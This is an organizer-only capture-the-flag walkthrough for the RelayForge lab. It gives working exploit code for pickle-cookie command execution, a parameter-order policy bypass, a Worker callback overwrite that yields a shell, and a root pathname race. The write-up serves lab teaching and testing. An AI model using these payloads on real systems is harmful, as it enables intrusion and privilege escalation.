## 7. Attack Flow

> **Organizer-only full solution.** This walkthrough describes intentional command execution and unrestricted host-root execution. The walkthrough applies only to the assigned disposable RelayForge instance and is not suitable as the initial player handout.
>
> **Evidence labels:** Source-confirmed means the behavior is present in the current workspace. Verified means a cited local test passed. Expected means deployment behavior follows from source but has not been reproduced on EC2. Unverified means live deployment evidence is unavailable. No live EC2 exploit or flag read is claimed here.

### 7.1 Overview and Starting Conditions

The intended chain crosses several separate trust boundaries:

```text
Assigned EC2 IP
  -> HTTPS portal and normal connection workflow
  -> authenticated Web command execution as UID 65532
  -> Web role's retained raw-request database function
  -> Access/Worker duplicate-profile parser differential
  -> short-lived signed Worker and token
  -> Worker PIE disclosure and bounded callback overwrite
  -> host shell as unprivileged relay
  -> root Supervisor diagnostic pathname race
  -> host UID 0 and generated root flag
```

Web command execution is not host execution. The raw database function does not grant database superuser access. The native Worker shell runs as host user `relay`, not root. The final transition is a Supervisor time-of-check/time-of-use (TOCTOU) flaw; it is not a Docker escape.

The scoring objective is the generated `/var/lib/relayforge/flag/root.txt`, which should be read only after the attacker proves host UID 0. The flag value must be redacted in reports and screenshots. The sample endpoint's `RF{browser_tunnel_success}` value is deliberately fake and proves only that the normal tunnel reached its private fixture.

The expected tools follow the stage: a browser and Developer Tools for the public portal; Burp when request fields or status details need inspection; Python's `pickletools` for safe local pickle disassembly; Ghidra for the downloaded ELF; a terminal TCP client for the Worker protocol; and a local Python socket client for the Supervisor's Unix-domain protocol. Shell commands are used when the challenge interface requires them, not as a substitute for browser-searchable pages.

There is an unresolved entry-stage blocker. The seeded account is not discoverable from the current public login page, and the login endpoint is rate-limited. A generic local wordlist does not establish that the account can be recovered. For an IP-only event, organizers need to provide a per-event credential clue or another bounded, tested recovery mechanism. Hydra should not be reported as a successful stage unless recovery has been demonstrated against the disposable deployment.

The current Nginx configuration advertises the Worker artifact through `/robots.txt`. This is source-confirmed locally; the matching configuration and artifact still need to be confirmed on the deployed EC2 instance.

### 7.2 Stage 1: Web Exploitation

The attacker should begin in a browser with the assigned HTTPS address and confirm that it is the event's target. A certificate warning should be accepted only when the lab instructions say the certificate is expected. The root page leads to the login form. After receiving an authorized account through the event's recovery mechanism, the attacker should log in normally; a scanner or shell script is not the natural first step.

An initial port scan is optional if the event handout already documents the public surface. If organizers require independent port enumeration, the attacker should scan only the assigned target and the ports explicitly in scope. The transient Worker range should not be inferred from an early scan: no Worker is listening until an approved request launches one, and its exact port is later shown in the authenticated status view.

The next step is for the attacker to submit one ordinary connection request through the dashboard, follow its status page, and open the temporary relay link while the job is running. This demonstrates the intended product behavior: HTTPS is the control plane, and a separate transient Worker proxies the private endpoint. The sample endpoint's `RF{browser_tunnel_success}` value is a fixture string, not the challenge flag and not evidence of command execution.

The attacker should use the browser's Developer Tools to inspect the authenticated cookies and the requests made by the dashboard. Once the cookie notice appears, the next step is to follow its **Cookie Policy** link. The policy names `remember_prefs`, `JobTemplate`, and `JobRunner`. These are investigation clues, not proof that the classes are exploitable. The exact deserialization hooks and output-retrieval route are not exposed by the normal UI.

#### 7.2.1 Establish what the login page does and does not reveal

The browser login form exposes username, password, and a CSRF field. A deliberately invalid login reveals the submitted field names, the failure message, and the ordinary response behavior. Burp's HTTP history can help inspect the request and response if the browser view does not make them clear. The current Web implementation rate-limits `/login` to eight requests per minute, allows a small burst, and sleeps after a failed authentication attempt.

The account seed is in organizer-side database initialization, not in the public UI. No public registration or password-recovery route exposes the credentials or a password hash. A generic wordlist is not a realistic discovery mechanism, and this report does not claim a successful Hydra run. An IP-only event needs an organizer-provided account, a narrowly bounded credential clue, or a public offline-cracking artifact before the attacker can proceed. If organizers deliberately provide bounded username/password lists, a Hydra form can be derived from the observed request, but its CSRF/session behavior and failure matching must first be tested in the disposable deployment.

**Screenshot needed:** browser login page and, if useful, a Burp invalid-login request/response showing the form field names, CSRF field, and failure message. Session cookies and any submitted credentials must be redacted. This capture documents the interface; it does not prove credential recovery.

#### 7.2.2 Inspect the remembered-preferences cookie

After a valid account is supplied or recovered through the event mechanism, the attacker should inspect the successful login response and browser cookie storage. The `remember_prefs` cookie is separate from the Flask `session` cookie. The **Cookie Policy** page describes it as encoded preference data and names `JobTemplate` and `JobRunner`; it misleadingly says those classes are not used.

The attacker can copy the cookie value from Developer Tools and inspect it locally as data. The following commands are optional local analysis; they are not commands sent to the target and do not execute the pickle:

```bash
python3 -c 'import base64,sys; sys.stdout.buffer.write(base64.b64decode(sys.argv[1], validate=True))' \
  '<remember_prefs-value>' > /tmp/remember-prefs.pickle
python3 -m pickletools /tmp/remember-prefs.pickle
```

Finding a pickle global such as `prefs.RememberedPrefs` makes server-side deserialization worth investigating. It does not reveal the state hooks or prove code execution. The class names on the policy page do not explain how to arrange the gadget, and the public UI does not expose the one-shot result route. Those details require a permitted sanitized source artifact or staged hint; without one, the exact next step is not fairly discoverable.

**Screenshot needed:** browser cookie storage or a redacted Burp response showing the cookie name and attributes, plus the policy passage naming the classes. Never include the complete cookie value in the report.

#### 7.2.3 Build the local Web command wrapper from the disclosed behavior

Once the sanctioned source artifact or hint explains the `JobTemplate` and `JobRunner` state hooks and the one-shot result route, the attacker can construct the serialized value locally. This is when terminal commands become necessary: the browser can reveal and replay cookies, but it does not build a Python pickle or conveniently collect detached process output.

The attacker should set `RF_BASE` to the assigned portal URL and `RF_SESSION` to the authenticated Flask session value observed in Developer Tools. The values are local shell variables; `RF_SESSION` is a secret and should not be saved in a screenshot. The following functions are attacker-authored convenience wrappers, not installed commands, target endpoints, or repository exploit helpers. Their names are arbitrary. They encode the discovered behavior: build a pickle containing the allowed classes, send it to the dashboard, and poll the authenticated one-shot result endpoint.

```bash
RF_HOST='<assigned-ec2-ip>'
RF_BASE="https://$RF_HOST"
RF_SESSION='<session-cookie-value-from-the-browser>'

rf_cookie_for() {
  RF_CMD="$1" python3 - <<'PY'
import base64
import os
import pickle
import sys
import types

module = types.ModuleType("prefs")
for name in ("JobTemplate", "JobRunner"):
    cls = type(name, (), {"__module__": "prefs"})
    setattr(module, name, cls)
sys.modules["prefs"] = module

template = module.JobTemplate()
template.command = os.environ["RF_CMD"]
runner = module.JobRunner()
runner.armed = True

print(base64.b64encode(pickle.dumps([template, runner], protocol=4)).decode("ascii"))
PY
}

rf_web_exec() {
  local plain_command="$1"
  local result_name result_path captured cookie body attempt

  result_name="$(python3 -c 'import secrets; print(secrets.token_hex(16)+".txt")')"
  result_path="/tmp/relayforge-results/$result_name"
  captured="($plain_command) > $result_path.tmp 2>&1; mv -- $result_path.tmp $result_path"
  cookie="$(rf_cookie_for "$captured")" || return 1

  curl -ksS \
    -H "Cookie: session=$RF_SESSION; remember_prefs=$cookie" \
    "$RF_BASE/dashboard" \
    -o /dev/null || return 1

  attempt=0
  while [ "$attempt" -lt 40 ]; do
    attempt=$((attempt + 1))
    body="$(curl -ksS -H "Cookie: session=$RF_SESSION" "$RF_BASE/api/result/$result_name")"
    if printf '%s' "$body" | python3 -c \
      'import json,sys; raise SystemExit(0 if "output" in json.load(sys.stdin) else 1)' \
      2>/dev/null
    then
      printf '%s' "$body" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["output"], end="")'
      return 0
    fi
    sleep 0.1
  done

  echo 'no one-shot result returned' >&2
  return 1
}
```

`curl` appears inside this local wrapper only because it must replay a crafted cookie to the dashboard and poll a result endpoint not linked from the UI. The attacker does not need `curl` to discover the portal, policy page, or Worker artifact; those are browser-discoverable. The result name is generated anew for every command because the endpoint is bounded and one-shot.

The first use should be a harmless identity and location check, followed by the Web-only marker:

```bash
rf_web_exec 'id'
rf_web_exec 'pwd'
rf_web_exec 'cat /opt/relayforge/web/STAGE_1_WEB.txt'
```

Expected output identifies UID/GID `65532:65532` and the marker `RELAYFORGE_STAGE=1_WEB_CONTAINER`. The identity and marker together establish command execution inside the Web container. They do not provide host access.

**Screenshot needed:** a redacted dashboard request showing the malicious cookie omitted or fully masked, and a separate terminal capture showing `id`, `pwd`, and the Web marker. The cookie value must not appear.

### 7.3 Stage 2: Web-to-Database Pivot and Policy Bypass

The Web foothold is already established at this point: a command result identified UID/GID `65532:65532` and read `/opt/relayforge/web/STAGE_1_WEB.txt`. The purpose of this stage is not to turn that container into root. The attacker should identify the narrow capability already available to the Web service and use it to create a request that the normal dashboard does not permit.

#### 7.3.1 Enumerate the Web process before making a database call

The attacker should first establish the process identity and working directory, then enumerate application files and environment-variable names. The attacker should avoid dumping all environment values because the database password is present. The file listing should reveal the adapter path rather than the attacker assuming a source filename in advance.

The `rf_web_exec` and `rf_cookie_for` local shell functions were defined in Stage 1 after the source clue established the pickle gadget and result route. They are attacker-authored wrappers; they are not commands supplied by the target. The attacker should now use them only for focused questions about the Web process and its existing capabilities.

```bash
rf_web_exec 'id'
rf_web_exec 'pwd'
rf_web_exec 'find /opt/relayforge/web -maxdepth 3 -type f -print | sort'
rf_web_exec 'env | cut -d= -f1 | sort'
rf_web_exec 'printf "DB_HOST=%s\nDB_NAME=%s\nDB_USER=%s\n" "$DB_HOST" "$DB_NAME" "$DB_USER"'
rf_web_exec 'ls -l /var/run/docker.sock /run/relayforge/supervisor.sock 2>&1'
```

The expected findings are a Web application directory under `/opt/relayforge/web`, the restricted database user `relay_web`, and no Docker or Supervisor socket. This explains why the next action is a database function call from inside the Web container, not a host-file read or a direct PostgreSQL connection from the player's computer.

The next step is for the attacker to inspect the discovered adapter around `submit_raw_request`. The file inventory should reveal its path; in the current image it is `/opt/relayforge/web/app/db.py`. The function accepts a username, target, service, duration, and raw options string; normal HTTP handlers do not call it. This is the first evidence that an internal capability exists beyond the visible dashboard form.

**Screenshot needed:** the report should include one terminal capture showing `id`, `pwd`, the application file listing, only the relevant DB variable names, socket-not-found/denied results, and the adapter function. Any password, session, or unrelated environment value should be cropped or redacted. If the capture was not taken during the run, it should remain a requested checkpoint; it should not be reconstructed from source and labeled as live evidence.

#### 7.3.2 Test the database role's boundary

The adapter uses `psycopg2`, already installed in the Web image. The attacker should query using the existing environment without printing the password. A role check should show `relay_web`. A private-table read should fail with permission denied; that negative result is important because it demonstrates the function grant is narrow rather than general database access.

The next step is for the attacker to make a harmless baseline request through the discovered function using an allowed dashboard target, service `echo`, duration within the accepted range, and ordinary options such as `profile=safe&note=manual`. The function returns a request UUID. The attacker should follow that UUID in the already observed authenticated status view and record request state/reason before introducing duplicates. This separates “the RPC works” from “the crafted policy input works.”

The exact call shape, to be executed by the Web command primitive, is:

```sql
SELECT relay_web_api.submit_raw_request(
  %s,  -- authenticated username
  %s,  -- target granted to that account by the dashboard
  %s,  -- allowed service, e.g. echo
  %s,  -- duration in the allowed range
  %s   -- raw options string
);
```

The attacker should use SQL parameters for all five values. `DB_PASSWORD` should remain inside the Web process environment and should not appear in screenshots or report text.

#### 7.3.3 Derive the duplicate-profile input experimentally

The attacker should compare these four raw values one request at a time:

```text
profile=safe&note=manual
profile=legacy&note=manual
profile=safe&note=manual&profile=legacy
profile=legacy&note=manual&profile=safe
```

The attacker should hold the account, target, service, duration, and note constant, then use each returned request ID to inspect the authenticated status response. If the first profile controls Access authorization, the first single-profile safe value and the duplicate order beginning with `safe` should proceed; the `legacy`-first versions should be rejected. The rejected reverse-order request is the negative control.

The candidate pivot is therefore:

```text
profile=safe&note=manual&profile=legacy
```

The attacker should not infer this result from source alone. Player-facing evidence is the difference in request outcomes, followed by a legacy-only Worker command succeeding on the approved request. Local `tests/test_policy.py` verifies Access's first-value behavior, but that is local implementation evidence, not an EC2 replay.

To make the comparison, the attacker should submit each value through the discovered RPC, not through the normal dashboard form. The account name comes from the authenticated browser session, and the target identifier comes from the dashboard's granted-target list. These are not values to guess. The following local shell command wraps a parameterized `psycopg2` call inside the already-defined Web command primitive:

```bash
RF_USER='<authenticated account name>'
RF_TARGET='<target identifier shown by the dashboard>'
RF_RAW_OPTIONS='profile=safe&note=manual'

RF_DB_COMMAND="python3 -c 'import os,psycopg2; c=psycopg2.connect(host=os.environ[\"DB_HOST\"],dbname=os.environ[\"DB_NAME\"],user=os.environ[\"DB_USER\"],password=os.environ[\"DB_PASSWORD\"]); q=c.cursor(); q.execute(\"SELECT relay_web_api.submit_raw_request(%s,%s,%s,%s,%s)\",(\"$RF_USER\",\"$RF_TARGET\",\"echo\",60,\"$RF_RAW_OPTIONS\")); value=q.fetchone()[0]; c.commit(); print(value)'"
RF_REQUEST_ID="$(rf_web_exec "$RF_DB_COMMAND" | tail -n 1)"
printf 'request id: %s\n' "$RF_REQUEST_ID"
```

This command is executed inside the Web container because `rf_web_exec` sends it as the deserialized command and returns its output. The SQL statement uses placeholders for all RPC arguments; the credential remains in the Web process environment. For the next trial, the attacker changes only `RF_RAW_OPTIONS`, resubmits, and records the new request UUID. The attacker should run the four values above individually so each result can be tied to one input.

The request UUID and state should then be inspected in the same dashboard connection/status view used for the ordinary baseline. If the page does not display the reason or full state fields, the attacker can inspect the corresponding request in Developer Tools' Network panel or Burp HTTP history. A manual `curl` poll is unnecessary when the authenticated browser already exposes the status resource.

Once the duplicate request is accepted, the next step is to monitor its normal status page. Because the Worker starts asynchronously, the attacker should record both `request_state=approved` and `job_state=running`, then note the allocated port and token. The token is a short-lived bearer capability and should be redacted from every screenshot. A range scan before the job starts is premature because no Worker listener exists to discover.

The Worker lifetime is at most 420 seconds. Binary analysis should therefore be completed before the final differential request when possible. If the Worker expires, the attacker must submit a fresh request and obtain a new port, token, job ID, and later a new PIE leak.

**Screenshot needed:** the report should include a paired status capture for forward and reverse duplicate order, including state/reason and enough of each request to distinguish the test values. A second capture should show the successful request's running state, allocated port range, token length, and partially masked job ID. The full token, username, session cookie, and CSRF value should be redacted.

### 7.4 Stage 3: Discover and Analyze the Worker

#### 7.4.1 Find the artifact through ordinary web discovery

The attacker should open `https://<assigned-host>/robots.txt` in a browser. The current Nginx response advertises `/artifacts/relay-worker`; the next step is to follow that advertised path and download the file in the browser. This is a normal web-enumeration step, not a path guessed from the organizer repository. The artifact route and `robots.txt` content are source-confirmed in the current workspace, but remote availability must be verified against the actual deployment.

The attacker should inspect the downloaded file as a binary, not as a text document, and record its architecture, ELF type, protections, and SHA-256. On macOS, `shasum -a 256` is available by default; Ghidra is sufficient for static analysis if GNU `readelf`/`objdump` are unavailable. If GNU binutils are available, useful checks include:

```bash
file relay-worker
shasum -a 256 relay-worker
readelf -hW relay-worker
readelf -lW relay-worker
readelf -dW relay-worker
strings -a relay-worker | grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
```

The expected build is AMD64 ELF PIE with a non-executable stack and RELRO protections. These protections do not remove the intended flaw: the chain leaks a live function address and overwrites an existing callback instead of injecting code. A locally calculated digest identifies the file the attacker analyzed; it authenticates the deployment only if compared with an independently trusted digest.

**Screenshot needed:** the report should show the browser view of `robots.txt` with the advertised artifact path, followed by file properties/ELF header and SHA-256. The downloaded file should not be described as the deployed binary unless the route was fetched from the assigned instance and its digest recorded.

#### 7.4.2 Trace the protocol strings into code

The next step is for the attacker to import the downloaded file into a new Ghidra project, confirm it is a 64-bit little-endian AMD64 ELF, and run auto-analysis. The project should record the input hash in its notes. In **Window > Defined Strings**, the attacker should search for `TOKEN`, `ERR auth`, `LEAK`, `OVERFLOW`, `worker_shell=`, `CONNECT`, `ERR size`, and the shell banner. A relevant string should be opened and its references inspected; following those references and callers should reveal the command-dispatch function.

The string listing is a map, not proof of reachability. The attacker should follow conditional branches in the Listing and decompiler to establish which mode enables each command and what the authentication error path does. The screenshots already in `screenshots/` support these static-analysis observations:

![Ghidra Defined Strings showing Worker protocol strings](screenshots/2026-10-16%2023.00.52.jpg)

The `profile` parser processes `&`-separated pairs in sequence and updates its mode when it encounters `profile`. The later assignment therefore determines the Worker's final profile. This is the Worker side of the first-vs-last differential; the Access side was tested through the paired status outcomes in Stage 2.

![Ghidra profile parser showing the legacy-mode assignment](screenshots/2026-10-16%2023.00.25.jpg)

The next step is for the attacker to follow the command-dispatch path and verify that `LEAK` and `OVERFLOW` are behind the legacy-mode check. The attacker should then compare that branch with the live safe-mode control: the safe Worker should answer `ERR command` to `LEAK`, while the accepted duplicate-profile Worker should permit it.

![Ghidra command handler showing the legacy-mode gate](screenshots/2026-10-16%2023.00.39.jpg)

**Screenshot needed:** the report should include a Ghidra screenshot with the string/XREF and legacy-mode branch visible together, or two readable screenshots if one view is too cramped. The program name and enough address/context to identify the function should be visible. The supplied images appear to cover strings, parser assignment, and mode gating; an additional screenshot is needed only if the branch or XREF is not legible in those files.

### 7.5 Stage 4: Authenticate to and Exploit the Worker

#### 7.5.1 Confirm the live token gate

The attacker should use the port and token from the approved/running request status. The token is 48 lowercase hexadecimal characters and belongs only to this Worker lifetime. The next step is to connect to the specific allocated port; a full-range scan is unnecessary once the status page has supplied it. The attacker should send a one-character-mutated token first and record `ERR auth`, then authenticate with the exact token and confirm the Worker banner, job identifier, and `OK` response. The full token should not appear in a capture.

At this point a terminal TCP client is appropriate: Ghidra has revealed a line-oriented protocol, while the portal has supplied the specific live port and token. The attacker should first mutate one token character and verify rejection, then authenticate with the real token. `nc` is not being used to discover an unknown service or URL; it is being used to test the already identified protocol on the assigned port.

```bash
RF_PORT='<port shown in the running request status>'
RF_TOKEN='<48-hex token shown in the running request status>'
RF_BAD_TOKEN="$(python3 -c 'import sys; value=sys.argv[1]; print(("1" if value[0]=="0" else "0")+value[1:])' "$RF_TOKEN")"

printf 'TOKEN %s\n' "$RF_BAD_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
printf 'TOKEN %s\nQUIT\n' "$RF_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
```

The first response should be `ERR auth`; the second should include the Worker banner, job identifier, and `OK`. If the port is unreachable despite a running status, the attacker should stop and check that the current network is within the configured player CIDR and that the AWS security group permits the selected port. A broad range scan is not the next step.

With a valid session, the attacker should issue `LEAK`. The response `worker_shell=0x...` is a live address for the current PIE process. This is useful because PIE randomizes the function address; it does not make the address portable across restarts. A safe-mode Worker should reject the same command, providing the runtime control for the Ghidra branch analysis.

The next step is to send `LEAK` on the authenticated connection. The command was found by tracing the string and dispatch branch in the downloaded binary; it should not be guessed before that analysis.

```bash
RF_PROBE="$(printf 'TOKEN %s\nLEAK\nQUIT\n' "$RF_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT")"
printf '%s\n' "$RF_PROBE"
RF_LEAK="$(printf '%s\n' "$RF_PROBE" | sed -n 's/^worker_shell=//p')"
test -n "$RF_LEAK" && printf 'worker_shell=%s\n' "$RF_LEAK"
```

The leaked address must be retained only for this Worker lifetime. If the request expires or the Worker restarts, a fresh approved request and a fresh leak are required.

**Screenshot needed:** the report should include one terminal transcript containing the wrong-token rejection, valid-token acceptance, and legacy `LEAK` response. The token should be replaced with `[REDACTED]` or masked; the leaked pointer should be retained only if event policy permits it. If the token or pointer should not be retained, the response label and address format can remain visible while its value is masked.

#### 7.5.2 Verify the callback frame in Ghidra

The attacker should follow the `OVERFLOW ` string reference into the request handler, trace the size parsing, and confirm the maximum accepted request is 136 bytes before treating the payload length as known. The next step is to follow the call into `vulnerable_debug`.

The decompiler view suggests a 128-byte data region followed by a callback. The attacker should verify this in the Listing rather than relying on guessed decompiler types: identify the frame base, the byte-copy loop and its termination condition, the callback stack slot loaded after the copy, the slot's offset from the frame base, and the caller's 136-byte bound. On AMD64, 128 bytes of data followed by an eight-byte function pointer gives the observed total of 136 bytes. The target is the callback field, not a return address or an unbounded buffer.

![Ghidra decompiler showing the vulnerable function's stack locals and copy loop](screenshots/2026-10-16%2023.00.29.jpg)

![Ghidra Listing showing the callback load and indirect call](screenshots/2026-10-16%2022.59.53.jpg)

**Screenshot needed:** the current two images are the intended evidence for the 128-byte area and callback. If the caller-side 136-byte cap is not visible in either, the report should include one additional Ghidra Listing/decompiler view at the size check, labeled “maximum accepted frame length.” The ELF hash should accompany the screenshot notes so the analysis can be tied to the exact artifact.

#### 7.5.3 Overwrite the callback and prove the `relay` boundary

The tested frame consists of 128 filler bytes followed by the leaked `worker_shell` address encoded as a little-endian 64-bit value. The attacker must send it as binary data, without a newline after those 136 bytes, and keep the TCP input open so the spawned interactive shell can receive commands.

```bash
{
  printf 'TOKEN %s\nOVERFLOW 136\n' "$RF_TOKEN"
  python3 -c \
    'import struct,sys; sys.stdout.buffer.write(b"A"*128 + struct.pack("<Q", int(sys.argv[1], 0)))' \
    "$RF_LEAK"
  cat
} | nc "$RF_HOST" "$RF_PORT"
```

The callback now points to the live `worker_shell` function, which attaches `/bin/sh -i` to the client socket. In the resulting shell, the attacker should run these checks separately so the privilege boundary is unambiguous:

```sh
id
pwd
cat /var/lib/relayforge/stages/STAGE_2_WORKER.txt
cat /var/lib/relayforge/stages/STAGE_3_ROOT.txt 2>&1
cat /var/lib/relayforge/flag/root.txt 2>&1
```

Expected: `id` reports user `relay`; `pwd` is under the active job's Worker work directory; Stage 2 is readable; Stage 3 and the root flag are denied. This proves host command execution as an unprivileged service account. It is not a Docker escape and not UID 0.

**Screenshot needed:** the report should include a terminal capture showing the Worker shell banner, `id`, `pwd`, the Stage 2 marker, and both permission denials. The job UUID should be masked if required by event policy. The supplied Ghidra images do not replace this runtime proof.

### 7.6 Stage 5: Race the Root Supervisor

#### 7.6.1 Discover the local Supervisor interface

The attacker should continue from the Worker shell, not from the Web container. The current working directory identifies the active job's work area. The next step is to inspect `/run` and the installed runtime directory before assuming the socket or source path:

```sh
ls -la /run
ls -la /run/relayforge 2>&1
find /opt/relayforge/runtime -maxdepth 1 -type f -print 2>/dev/null | sort
```

The Stage 2 marker and host-local inventory should lead the attacker to `/run/relayforge/supervisor.sock` and `/opt/relayforge/runtime/supervisor.py`. After discovering those paths, the attacker should check socket permissions and inspect the `diagnose` implementation:

```sh
ls -l /run/relayforge/supervisor.sock
sed -n '/def run_diagnostic/,/def _remove_state/p' /opt/relayforge/runtime/supervisor.py
```

The Supervisor checks the Unix peer UID, active job identity, Worker cgroup, job expiry, exact basename, file type, ownership, mode, link count, size, and exact initial file bytes. These checks explain why the operation is restricted to a shell in the active Worker and why the benign file must be exact. The current protocol has `launch`, `stop`, and `diagnose`; there is no `archive` operation or archive-based flag shortcut.

The critical flaw is object identity across validation and use. Supervisor opens the benign path, checks its contents and metadata, closes that descriptor, sends a `validated` acknowledgement, waits 250 ms, then executes the pathname as root. Since it resolves the pathname again, an atomic replacement after acknowledgement can make the executed file differ from the validated file.

#### 7.6.2 Prepare the benign file and replacement

The attacker should derive the job ID from the active work path rather than guessing. The next step is to create the exact benign diagnostic content, set its required mode, and verify its size, owner, link count, and bytes. The expected size is 46 bytes.

```sh
RF_JOB_ID="$(basename "$(dirname "$PWD")")"
printf "#!/bin/sh\nprintf 'RelayForge diagnostic OK\\n'\n" > diagnostic.sh
chmod 700 diagnostic.sh
wc -c diagnostic.sh
stat -c 'owner=%U group=%G mode=%a links=%h size=%s' diagnostic.sh
cat diagnostic.sh
```

The attacker should prepare the replacement under a different pathname so it is not present at the path Supervisor validates:

```sh
printf '#!/bin/sh\nid\ncat /var/lib/relayforge/stages/STAGE_3_ROOT.txt\nprintf "ROOT_FLAG="\ncat /var/lib/relayforge/flag/root.txt\n' > root.sh
chmod 700 root.sh
```

The attacker should leave the benign file unchanged after the metadata check and until the Supervisor's acknowledgement. The race occurs specifically between the acknowledgement and the later path re-open.

#### 7.6.3 Send the request and replace after acknowledgement

This is a Unix-domain socket request, not an HTTP form, so Burp is not involved. The next step is for the attacker to use a small Python client to send one newline-delimited JSON message, read the acknowledgement, atomically rename the replacement to `diagnostic.sh`, and print the remainder of the same socket response:

```sh
python3 -c 'import json,os,socket,sys; j=sys.argv[1]; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect("/run/relayforge/supervisor.sock"); frame=(json.dumps({"op":"diagnose","job_id":j,"name":"diagnostic.sh"},separators=(",",":"))+"\n").encode(); s.sendall(frame); f=s.makefile("rb",buffering=0); ack=f.readline(); assert json.loads(ack)=={"ok":True,"state":"validated"}; os.replace("root.sh","diagnostic.sh"); sys.stdout.buffer.write(ack+f.read())' "$RF_JOB_ID"
```

The expected output begins with the validation acknowledgement, followed by `id` reporting UID 0, the root-only Stage 3 marker, and a `ROOT_FLAG=RF{...}` line. The flag value should be redacted in the report. If the benign diagnostic message appears instead, replacement did not win that attempt; the attacker should recreate both files and retry while the Worker is still active. A successful root boundary should not be claimed without the UID 0 output.

**Screenshot needed:** the report should include the benign file's `wc -c` and `stat` output before the request, followed by a separate terminal capture showing the `validated` acknowledgement, final `id` output, and Stage 3 access. The flag contents, job UUID, and socket/process details not needed to demonstrate the result should be redacted. No current screenshot in the folder shows the Supervisor race, so these runtime captures are still needed if the stage was actually run.

Local `tests/test_supervisor.py` validates replacement execution after acknowledgement in a socketpair harness under the test process identity. That confirms race reachability and output handling, not unrestricted UID 0 on EC2. The root service configuration is source-confirmed; live EC2 operation, exact deployed service state, UID 0 response, and the generated flag remain unverified unless captured from the authorized instance.

### 7.7 Evidence and Verification Status

| Stage | Evidence to capture | What it establishes |
|---|---|---|
| Portal baseline | Normal request status and working temporary relay link | The public control plane and private-endpoint tunnel work |
| Web foothold | `id` output plus Web marker | Command execution as UID 65532 inside the Web container |
| Database pivot | Returned request UUID and paired option-order statuses | Narrow raw-request capability and Access's order-sensitive decision |
| Worker gate | Wrong-token rejection, valid-token banner, safe/legacy command comparison | Token authentication and legacy-only command availability |
| Worker shell | Ghidra screenshots, live leak, shell `id`, Stage 2 read and root-file denials | Binary analysis and host `relay` command execution |
| Supervisor race | Benign-file metadata, `validated` acknowledgement, final UID 0 and Stage 3 access | The pathname race crossed into host root |

Cookies, session values, Worker tokens, and job identifiers should remain redacted in public captures. The fake browser fixture flag is not challenge completion. Local unit tests can validate parser behavior or race reachability but do not prove a live EC2 root shell. The current workspace confirms the Nginx artifact route and implementation behavior; deployed reachability, the served ELF hash, AWS security-group access, and a live root-flag read remain unverified until tested against the authorized instance.

Local verification reported for this workspace includes `tests/test_policy.py` for Access's first-profile behavior and `tests/test_supervisor.py` for replacement execution after the validation acknowledgement in a local socketpair harness. The latter runs under the test process identity; it does not establish UID 0 on EC2. These tests support the implementation analysis, while a live deployment claim still requires the corresponding runtime screenshots and authorized replay.